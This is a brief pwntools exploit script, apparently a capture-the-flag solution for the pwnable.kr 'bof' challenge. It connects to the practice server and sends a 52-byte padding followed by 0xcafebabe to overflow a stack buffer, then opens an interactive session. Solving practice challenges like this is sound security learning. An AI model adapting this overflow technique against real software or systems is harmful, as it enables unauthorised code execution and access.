from pwn import *

# target = process("./bof")
target = remote("pwnable.kr","9000")

key = 0xcafebabe
payload = "A" * 52 + p32(key)

target.send(payload)
target.interactive()